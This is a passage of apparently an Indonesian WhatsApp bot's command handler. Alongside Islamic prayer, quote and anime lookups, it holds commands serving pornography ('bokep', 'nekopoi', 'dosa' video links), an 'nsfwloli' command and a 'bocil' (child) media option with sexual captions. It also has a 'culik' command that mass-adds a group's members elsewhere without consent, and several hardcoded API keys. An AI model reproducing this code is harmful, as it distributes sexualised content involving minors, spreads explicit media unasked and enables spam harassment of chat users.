				"Result : \n"
			for (var x of
					kontol) {
				ini_txt +=
					`${x.id}\n`
				ini_txt +=
					`${x.title}\n`
				ini_txt +=
					`${x.arabic}\n\n`
			}
			reply(ini_txt)
			limitAdd(sender,
				limit)
			break
		case 'doaharian':
			get_result =
				await fetchJson(
					`https://api.dapuhy.ga/api/islam/doaharian?apikey=${dappakey}`, {
						method: 'get'
					})
			kontol = get_result
				.result
			ini_txt =
				"Result : \n"
			for (var x of
					kontol) {
				ini_txt +=
					`${x.title}\n`
				ini_txt +=
					`${x.latin}\n`
				ini_txt +=
					`${x.translation}\n\n`
			}
			reply(ini_txt)
			limitAdd(sender,
				limit)
			break
		case 'niatshalat':

			get_result =
				await fetchJson(
					`https://api.dapuhy.ga/api/islam/niatshalat?apikey=${dappakey}`, {
						method: 'get'
					})
			kontol = get_result
				.result
			ini_txt =
				"Result : \n"
			for (var x of
					kontol) {
				ini_txt +=
					`${x.id}\n`
				ini_txt +=
					`${x.name}\n`
				ini_txt +=
					`${x.latin}\n\n`
			}
			reply(ini_txt)
			limitAdd(sender,
				limit)
			break
		case 'wirid':

			get_result =
				await fetchJson(
					`https://api.dapuhy.ga/api/islam/wirid?apikey=${dappakey}`, {
						method: 'get'
					})
			kontol = get_result
				.result
			ini_txt =
				"Result : \n"
			for (var x of
					kontol) {
				ini_txt +=
					`${x.id}\n`
				ini_txt +=
					`${x.times}\n`
				ini_txt +=
					`${x.arabic}\n`
				ini_txt +=
					`${x.tnc}\n\n`
			}
			reply(ini_txt)
			limitAdd(sender,
				limit)
			break
			/*  case 'ayatkursi': 
               
                    get_result = await fetchJson(`https://api.dapuhy.ga/api/islam/ayatkursi?apikey=${dappakey}`, {method: 'get'})
                    kontol = get_result.result
                    ini_txt = "Result : \n"
                    for (var x of kontol) {
                        ini_txt += `${x.tafsir}\n`
                        ini_txt += `${x.arabic}\n`
                        ini_txt += `${x.latin}\n`
                    }
                    reply(ini_txt)
                    limitAdd(sender, limit)
                    break   */
		case 'ayatkursi':
			get_result =
				await fetchJson(
					`https://api.dapuhy.ga/api/islam/ayatkursi?apikey=${dappakey}`
				)
			get_result =
				get_result
				.result
			ini_txt =
				`Tasfir : ${get_result.tafsir}\n`
			ini_txt +=
				`arabic : ${get_result.arabic}\n`
			ini_txt +=
				`Size : ${get_result.latin}\n`
			reply(ini_txt)
			break
		case 'nekopoi':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`
			)
			ini_url = args[0]
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/nekopoi?apikey=${setting.lolkey}&url=${ini_url}`
				)
			get_result =
				get_result
				.result
			ini_txt =
				`\`\`\`き⃟👉 Title : ${get_result.anime}\`\`\`\n`
			ini_txt +=
				`\`\`\`き⃟👉 Porducers : ${get_result.producers}\`\`\`\n`
			ini_txt +=
				`\`\`\`き⃟👉 Duration : ${get_result.duration}\`\`\`\n`
			ini_txt +=
				`\`\`\`き⃟👉 Size : ${get_result.size}\`\`\`\n`
			ini_txt +=
				`\`\`\`き⃟👉 Sinopsis : ${get_result.sinopsis}\`\`\`\n`
			link = get_result
				.link
			for (var x in
					link) {
				ini_txt +=
					`\n${link[x].name}\n`
				link_dl = link[
					x].link
				for (var y in
						link_dl) {
					ini_txt +=
						`${y} - ${link_dl[y]}\n`
				}
			}
			ini_buffer =
				await getBuffer(
					get_result
					.thumb)
			await Maslent
				.sendMessage(
					from,
					ini_buffer,
					image, {
						quoted: mek,
						caption: ini_txt
					})
			break
		case 'nekopoisearch':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} Isekai Harem`
			)
			query = args.join(
				" ")
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${setting.lolkey}&query=${query}`
				)
			get_result =
				get_result
				.result
			ini_txt = ""
			for (var x of
					get_result) {
				ini_txt +=
					`\`\`\`き⃟👉 Title : ${x.title}\`\`\`\n`
				ini_txt +=
					`\`\`\`き⃟👉 Link : ${x.link}\`\`\`\n`
				ini_txt +=
					`\`\`\`き⃟👉 Thumbnail : ${x.thumbnail}\`\`\`\n\n`
			}
			reply(ini_txt)
			break
		case 'neko':
		case 'kanna':
		case 'sagiri':
		case 'megumin':
		case 'wallnime':
			reply(mess.wait)
			getBuffer(
				`https://api.lolhuman.xyz/api/random/${command}?apikey=${setting.lolkey}`
			).then((
				gambar
			) => {
				Maslent
					.sendMessage(
						from,
						gambar,
						image, {
							quoted: mek,
							thumbnail: Buffer
								.alloc(
									0
								)
						}
					)
			})
			break
		case 'bokep':

			reply(mess.wait)

			aprii =
				await getBuffer(
					`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`
				)

			Maslent.sendMessage(
				from, aprii,
				video, {
					mimetype: 'video/mp4',
					quoted: mek
				})

			break
		case 'dosa1':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)
			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file'
				})

			break

		case 'dosa2':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file'
				})

			break

		case 'dosa3':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file'
				})

			break

		case 'dosa4':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file'
				})

			break

		case 'dosa5':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file'
				})

			break

		case 'dosa6':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file'
				})

			break

		case 'dosa7':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file'
				})

			break

		case 'dosa8':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file'
				})

			break

		case 'dosa10':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file'
				})

			break

		case 'dosa11':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file'
				})

			break

		case 'dosa12':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file'
				})

			break

		case 'dosa13':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file'
				})

			break

		case 'dosa14':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file'
				})

			break

		case 'dosa15':

			qute = fs
				.readFileSync(
					'./Maslent/zero.jpg'
				)

			Maslent.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file'
				})

			break
		case 'asupan':
			list = []
			listmenu = [
				`hijaber`,
				`cecanrandom`,
				`cecanvietnam`,
				`santuy`,
				`ukhty`,
				`ghea`,
				`rika`,
				`bocil`
			]
			listmenuu = [
				`CewekHijab`,
				`cewekRandom`,
				`CewekVietnam`,
				`ukthyboi`,
				`Ghea`,
				`rika`,
				`bocilbrok`
			]
			nombor = 1
			startnum = 0
			for (let x of
					listmenu) {
				const yy = {
					title: 'silahkan pilih menunya ' +
						nombor++,
					rows: [
					{
						title: `${listmenuu[startnum++]}`,
						description: ``,
						rowId: `${prefix}${x}`
					}]
				}
				list.push(yy)
			}
			listmsg(from,
				`${ucapanWaktu}`,
				`Hai kak......\n*${pushname}*\nPilih Disini asupan nye jan ngaceng ya`,
				list)
			break

			//━━━━━━━━━━━━━━━[ BAHAN ASUPAN ]━━━━━━━━━━━━━━━━━//
		case 'cecanvietnam':
			huft =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/cewe/vietnam?apikey=ZeroYT7`
				)
			reply(mess.wait)
			goo =
				await getBuffer(
					huft.result
					.url)
			Maslent.sendMessage(
				from, goo,
				image, {
					quoted: mek,
					caption: 'Nih Jangan Lupa Subscribe Project Maslent'
				})
			break
		case 'cecanrandom':
			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=ZeroYT7`
				)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			Maslent.sendMessage(
				from,
				buffer,
				image, {
					quoted: mek,
					caption: ''
				})
			break
		case 'hijaber':
			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/hijaber?apikey=ZeroYT7`
				)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			Maslent.sendMessage(
				from,
				buffer,
				image, {
					quoted: mek,
					caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'
				})
			break
		case 'santuy':
			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/santuy?apikey=ZeroYT7`
				)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			Maslent.sendMessage(
				from,
				buffer,
				video, {
					quoted: mek,
					caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'
				})
			break
		case 'ukhti':

			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/ukty?apikey=ZeroYT7`
				)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			Maslent.sendMessage(
				from,
				buffer,
				video, {
					quoted: mek,
					caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'
				})
			break
		case 'bocil':

			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/bocil?apikey=ZeroYT7`
				)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			Maslent.sendMessage(
				from,
				buffer,
				video, {
					quoted: mek,
					caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'
				})
			break
		case 'ghea':

			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/ghea?apikey=ZeroYT7`
				)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			Maslent.sendMessage(
				from,
				buffer,
				video, {
					quoted: mek,
					caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'
				})
			break
		case 'rika':

			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/rikagusriani?apikey=ZeroYT7`
				)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			Maslent.sendMessage(
				from,
				buffer,
				video, {
					quoted: mek,
					caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'
				})
			break

		case 'storyanime':
			reply(mess.wait)
			anu =
				await fetchJson(
					`http://api.lolhuman.xyz/api/storynime?apikey=${setting.lolkey}`
				)
			buffer =
				await getBuffer(
					anu.result)
			Maslent.sendMessage(
				from,
				buffer,
				video, {
					quoted: mek
				})
			break



		case 'otakuongoing':
			o = await onGoing()
			console.log(o)
			ot = '*「 Ongoing Otakudesu 」*'
			for (let i = 0; i <
				o.length; i++) {
				ot +=
					`\n\n*Judul :* ${o[i].judul}\n*Episode :* ${o[i].eps}\n*Eps berikutnya pada hari :* ${o[i].hri}\n*Tanggal :* ${o[i].tgl}\n\n*Image :* ${o[i].thumb}`
			}
			buff =
				await getBuffer(
					o[0].thumb)
			Maslent.sendMessage(
				from, buff,
				image, {
					quoted: mek,
					caption: ot
				})
			break
		case 'waifu':

			v = await fetchJson(
				`https://api.waifu.pics/sfw/waifu`
			)
			inifile =
				sendMediaURL(
					from, v.url,
				)
			buttons = [{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `➡️Next`
				},
				type: 1
			}, {
				buttonId: `${prefix}g`,
				buttonText: {
					displayText: 'STOP'
				},
				type: 1
			}]
			imageMsg = (
					await Maslent
					.prepareMessage(
						from,
						inifile,
						'imageMessage', {
							thumbnail: Buffer
								.alloc(
									0
								)
						}))
				.message
				.imageMessage
			buttonsMessage = {
				footerText: 'Jangan Lupa Donasi Ya Kak ☕',
				imageMessage: imageMsg,
				contentText: `klik Next untuk ke gambar selanjut nya`,
				buttons,
				headerType: 4
			}
			prep = await Maslent
				.prepareMessageFromContent(
					from, {
						buttonsMessage
					}, {
						quoted: mek
					})
			Maslent
				.relayWAMessage(
					prep)
			fs.unlinkSync(
				`./${sender}.jpeg`
			)
			break
		case 'loli':
		case 'husbu':
		case 'milf':
		case 'cosplay':
		case 'wallml':
			//    if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://Maslent-chan02.github.io`)
			let wipu = (
				await axios
				.get(
					`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`
				)).data
			let wipi = wipu[Math
				.floor(Math
					.random() *
					(wipu
						.length
					))]
			fs.writeFileSync(
				`./${sender}.jpeg`,
				await getBuffer(
					wipi))
			buttons = [{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `➡️Next`
				},
				type: 1
			}, {
				buttonId: `${prefix}Q`,
				buttonText: {
					displayText: 'STOP'
				},
				type: 1
			}]
			imageMsg = (
					await Maslent
					.prepareMessage(
						from, fs
						.readFileSync(
							`./${sender}.jpeg`
						),
						'imageMessage', {
							thumbnail: Buffer
								.alloc(
									0
								)
						}))
				.message
				.imageMessage
			buttonsMessage = {
				footerText: 'Jangan Lupa Donasi Ya Kak ☕',
				imageMessage: imageMsg,
				contentText: `klik Next untuk ke gambar selanjut nya`,
				buttons,
				headerType: 4
			}
			prep = await Maslent
				.prepareMessageFromContent(
					from, {
						buttonsMessage
					}, {
						quoted: mek
					})
			Maslent
				.relayWAMessage(
					prep)
			fs.unlinkSync(
				`./${sender}.jpeg`
			)
			break
		case "remm":

			if (args.length < 1)
				return reply(
					from,
					`Penggunaan ${prefix}vampire teks`,
					mek)
			reply(mess.wait)
			bapakao = body
				.slice(6)
			sendMediaURL(from,
				`https://hardianto-chan.herokuapp.com/api/bot/gfx5?apikey=hardianto&text=${bapakao}`
			)
			break
		case "lolim":

			if (args.length < 1)
				return reply(
					from,
					`Penggunaan ${prefix + command}teks`,
					mek)

			reply(mess.wait)
			bapakao = body
				.slice(7)
			sendMediaURL(from,
				`https://hardianto-chan.herokuapp.com/api/bot/gfx2?apikey=hardianto&nama=${bapakao}`
			)
			break
		case "kaneki":

			if (args.length < 1)
				return reply(
					from,
					`Penggunaan ${prefix + command}teks`,
					mek)
			reply(mess.wait)
			bapakao = body
				.slice(8)
			sendMediaURL(from,
				`https://hardianto-chan.herokuapp.com/api/bot/gfx1?apikey=hardianto&nama=${bapakao}`
			)
			break
		case "gura":

			if (args.length < 1)
				return reply(
					from,
					`Penggunaan ${prefix + command}teks`,
					mek)

			reply(mess.wait)
			bapakao = body
				.slice(6)
			sendMediaURL(from,
				`https://hardianto-chan.herokuapp.com/api/bot/gura?apikey=hardianto&nama=${bapakao}`
			)
			break
		case "neko":

			bapakao = body
				.slice(9)
			sendMediaURL(from,
				`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`
			)
			break
		case "bajingan":

			if (args.length < 1)
				return reply(
					from,
					`Penggunaan ${prefix}bajingan lu teks`,
					mek)
			bapakao = body
				.slice(10)
			sendStickerFromUrl(
				from,
				`https://hardianto-chan.herokuapp.com/api/creator/memegen?bawah=${bapakao}&atas=bajingan&imgurl=https://telegra.ph/file/d608ec3cb57ff6b9ac708.jpg&apikey=hardianto`
			)
			reply(
				"Succes Buat Fitur Bajingan,"
			)
			break

		case 'quotesanime': {

			if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
				)
			let anu =
				await axios.get(
					`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${lolkey}`
				)
			hehq =
				`*Quotes* : _${anu.data.result.quote}_\n\n*Karakter* : _―${anu.data.result.character}_\n\n*Anime* : _―${anu.data.result.anime}_\n\n*Episode* : _―${anu.data.result.episode}_`
			button = [
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '️➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			},
			{
				buttonId: `y`,
				buttonText: {
					displayText: '️❌ 𝑺𝒕𝒐𝒑'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${hehq}`,
				footerText: `Created By ©chi`,
				buttons: button,
				headerType: 1
			}
			await Maslent
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek
					})
			limitAdd(sender,
				limit)
			break
		}
		case 'quotesyt':
			dapuhy =
				await getBuffer(
					`https://api.dapuhy.ga/api/randomimage/quotesyt?apikey=${dappakey}`
				)
			let xixi =
				await Maslent
				.prepareMessageMedia(
					dapuhy,
					image, {
						thumbnail: thumb
					})
			let but = [
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: 'Lagi'
				},
				type: 1
			}]
			let buttonMessages = {
				contentText: 'Jangan lupa donasi kak><',
				footerText: `${fake}`,
				buttons: but,
				headerType: 4,
				...xixi
			}
			Maslent.sendMessage(
				from,
				buttonMessages,
				MessageType
				.buttonsMessage, {
					quoted: mek,
					thumbnail: thumb
				})

			break
			// Random Text //
		case 'quotes':

			quotes =
				await fetchJson(
					`https://api.lolhuman.xyz/api/random/quotes?apikey=${lolkey}`
				)
			quotes = quotes
				.result
			author = quotes.by
			quotes = quotes
				.quote
			hehe =
				`_${quotes}_\n\n*― ${author}*`
			button = [
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '️➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			},
			{
				buttonId: `y`,
				buttonText: {
					displayText: '️❌ 𝑺𝒕𝒐𝒑'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${hehe}`,
				footerText: `Created By ©chi`,
				buttons: button,
				headerType: 1
			}
			await Maslent
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek
					})
			limitAdd(sender,
				limit)
			break;
		case 'clearall':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.ownerB)
			anu = await Maslent
				.chats.all()
			Maslent
				.setMaxListeners(
					26)
			for (let _ of anu) {
				Maslent
					.deletechat(
						_.jid)
			}
			reply(
				'Sukses membersihkan semua pesan'
			)
			break

		case 'quotesislami':

			quotes =
				await fetchJson(
					`https://api.lolhuman.xyz/api/random/quotes?apikey=${lolkey}`
				)
			quotes = quotes
				.result
			author = quotes.by
			quotes = quotes
				.quote
			heha =
				`_${quotes}_\n\n*― ${author}*`
			button = [
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '️➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			},
			{
				buttonId: `y`,
				buttonText: {
					displayText: '️❌ 𝑺𝒕𝒐𝒑'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${heha}`,
				footerText: `Created By ©chi`,
				buttons: button,
				headerType: 1
			}
			await Maslent
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek
					})
			limitAdd(sender,
				limit)
			break;


		case 'quotesimage':
			yang =
				await getBuffer(
					`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`
				)
			let yag =
				await Maslent
				.prepareMessageMedia(
					yang,
					image, {
						thumbnail: thumb
					})
			let ge = [
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: 'Again'
				},
				type: 1
			}]
			let gb = {
				contentText: 'Jangan lupa donasi kak><',
				footerText: `${fake}`,
				buttons: ge,
				headerType: 4,
				...yag
			}
			Maslent.sendMessage(
				from, gb,
				MessageType
				.buttonsMessage, {
					quoted: mek,
					thumbnail: thumb
				})
			break

		case 'storyanime':
			if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
				)
			reply(mess.wait)
			kntl =
				await getBuffer(
					`https://api.dapuhy.ga/api/anime/storyanime?apikey=${dappakey}`
				)
			let xixiu =
				await Maslent
				.prepareMessageMedia(
					kntl,
					video, {
						thumbnail: thumb
					})
			let bot = [
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: 'Lagi'
				},
				type: 1
			}]
			let buttonMessagees = {
				contentText: 'Jangan lupa donasi kak><',
				footerText: `${fake}`,
				buttons: bot,
				headerType: 4,
				...xixiu
			}
			Maslent.sendMessage(
				from,
				buttonMessagees,
				MessageType
				.buttonsMessage, {
					quoted: mek,
					thumbnail: thumb
				})
			break

			/*case 'asupan':
			case 'asupansantuy':
			case 'asupanbocil':
			case 'asupanukhty':
			case 'asupanghea':

			kntl = await getBuffer(`https://api.dapuhy.ga/api/asupan/${command}?apikey=${dappakey}`)                    
			mhan2 = await Maslent.prepareMessage(from, kntl, video, { thumbnail: Mfake })
			ggbutsan = [
			{buttonId: `${prefix+command}`, buttonText: {displayText: '➡️ 𝑵𝒆𝒙𝒕'}, type: 1},
			{buttonId: `y`, buttonText: {displayText: '️❌ 𝑺𝒕𝒐𝒑'}, type: 1},
			]
			gbbuttonan = {
			videoMessage : mhan2.message.videoMessage,
			contentText: `CLICK NEXT UNTUK MELANJUTKAN`,
			footerText: `${fake}`,
			buttons: ggbutsan,
			headerType: 5
			}
			await Maslent.sendMessage(from, gbbuttonan, MessageType.buttonsMessage, {
			quoted: mek, contextInfo: { mentionedJid: [sender]}})
			limitAdd(sender, limit)
			break
			case 'asupanrika':

			kntl = await getBuffer(`https://api.dapuhy.ga/api/asupan/asupanrikagusriani?apikey=${dappakey}`)                    
			mhan2 = await Maslent.prepareMessage(from, kntl, video, { thumbnail: Mfake })
			ggbutsan = [
			{buttonId: `${prefix+command}`, buttonText: {displayText: '➡️ 𝑵𝒆𝒙𝒕'}, type: 1},
			{buttonId: `y`, buttonText: {displayText: '️❌ 𝑺𝒕𝒐𝒑'}, type: 1},
			]
			gbbuttonan = {
			videoMessage : mhan2.message.videoMessage,
			contentText: `CLICK NEXT UNTUK MELANJUTKAN`,
			footerText: `${fake}`,
			buttons: ggbutsan,
			headerType: 5
			}
			await Maslent.sendMessage(from, gbbuttonan, MessageType.buttonsMessage, {
			quoted: mek, contextInfo: { mentionedJid: [sender]}})
			limitAdd(sender, limit)
			break*/
		case 'nsfwloli':

			anu =
				await getBuffer(
					`https://api.lolhuman.xyz/api/random/nsfw/loli?apikey=${lolkey}`
				)
			buttons = [{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			}, {
				buttonId: '❌ 𝑺𝒕𝒐𝒑',
				buttonText: {
					displayText: '❌ 𝑺𝒕𝒐𝒑'
				},
				type: 1
			}]
			imageMsg = (
					await Maslent
					.prepareMessage(
						from,
						anu,
						'imageMessage', {
							thumbnail: Buffer
								.alloc(
									0
								)
						}))
				.message
				.imageMessage
			buttonsMessage = {
				footerText: 'Created By ©Maslent`',
				imageMessage: imageMsg,
				contentText: `Hai ${pushname} Silahkan Pilih`,
				buttons,
				headerType: 4
			}
			prep = await Maslent
				.prepareMessageFromContent(
					from, {
						buttonsMessage
					}, {
						quoted: mek,
						contextInfo: {
							"externalAdReply": {
								"title": `Nih Kak ${pushname}`,
								mediaType: 2,
								"thumbnailUrl": "https://telegra.ph/file/6b0259fd741e108910fbe.jpg",
								"previewType": "VIDEO",
								"mediaUrl": `https://youtu.be/HEq3zZ_0WCU`
							}
						}
					})
			Maslent
				.relayWAMessage(
					prep)
			limitAdd(sender,
				limit)
			break
		case 'nsfwyuri':
		case 'nsfwlesbian':
		case 'nsfwneko':
		case 'nsfwavatar':
		case 'nsfwtits':
		case 'nsfwketa':
		case 'nsfweroyuri':
		case 'nsfweroneko':
		case 'nsfwhentai':

			anu =
				await getBuffer(
					`https://api.dapuhy.ga/api/nsfw/${command}?apikey=${dappakey}`
				)
			buttons = [{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			}, {
				buttonId: '❌ 𝑺𝒕𝒐𝒑',
				buttonText: {
					displayText: '❌ 𝑺𝒕𝒐𝒑'
				},
				type: 1
			}]
			imageMsg = (
					await Maslent
					.prepareMessage(
						from,
						anu,
						'imageMessage', {
							thumbnail: Buffer
								.alloc(
									0
								)
						}))
				.message
				.imageMessage
			buttonsMessage = {
				footerText: 'Created By ©VNZBOT`',
				imageMessage: imageMsg,
				contentText: `Hai ${pushname} Silahkan Pilih`,
				buttons,
				headerType: 4
			}
			prep = await Maslent
				.prepareMessageFromContent(
					from, {
						buttonsMessage
					}, {
						quoted: mek,
						contextInfo: {
							"externalAdReply": {
								"title": `Nih Kak ${pushname}`,
								mediaType: 2,
								"thumbnailUrl": "https://telegra.ph/file/6b0259fd741e108910fbe.jpg",
								"previewType": "VIDEO",
								"mediaUrl": `https://youtu.be/HEq3zZ_0WCU`
							}
						}
					})
			Maslent
				.relayWAMessage(
					prep)
			limitAdd(sender,
				limit)
			break

		case 'antidelete':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (args.length < 1)
				return freply(
					'Pilih on atau off'
				)
			if (args[0] ===
				"on") {
				if (antidel ===
					true) return
				antidel = true
				freply(
					`Succes mengaktifkan antidelete`
				)
			} else if (args[
					0] ===
				"off") {
				if (antidel ===
					false)
					return
				antidel = false
				freply(
					`Succes mematikan antidelete`
				)
			} else {
				freply(
					`Pilih on atau off`
				)
			}
			break
		case 'autoread':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (args.length < 1)
				return reply(
					`Example:\n${prefix}autoread gc on`
				)
			if (args[0] ===
				"gc") {
				if (args
					.length < 2)
					return reply(
						`Example:\n${prefix}autoread gc on`
					)
				if (args[1] ===
					"on") {
					if (readG ===
						true)
						return
					readG = true
					reply(
						`Succes mengaktifkan autoread group`
					)
				} else if (args[
						1] ===
					"off") {
					if (readG ===
						false)
						return
					readG =
						false
					reply(
						`Succes mematikan autoread group`
					)
				} else {
					reply(
						`Pilih on atau off`
					)
				}
			} else if (args[
					0] ===
				"pc") {
				if (args
					.length < 2)
					return reply(
						`Example:\n${prefix}autoread pc on`
					)
				if (args[1] ===
					"on") {
					if (readP ===
						true)
						return
					readP = true
					reply(
						`Succes mengaktifkan autoread pribadi`
					)
				} else if (args[
						1] ===
					"off") {
					if (readP ===
						false)
						return
					readP =
						false
					reply(
						`Succes mematikan autoread pribadi`
					)
				} else {
					reply(
						`Pilih on atau off`
					)
				}
			} else {
				reply(
					`*List Auto Read*\n•> gc\n•> pc`
				)
			}
			break


		case 'culik':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (args.length < 1)
				return reply(
					'Masukin id grupnya'
				)
			let pantek = []
			for (let i of
					groupMembers) {
				pantek.push(i
					.jid)
			}
			Maslent.groupAdd(
				args[0],
				pantek)
			break
		case 'ytplay':
		case 'ytdl':
			reply(mess.wait)
			//query = args.join(" ")
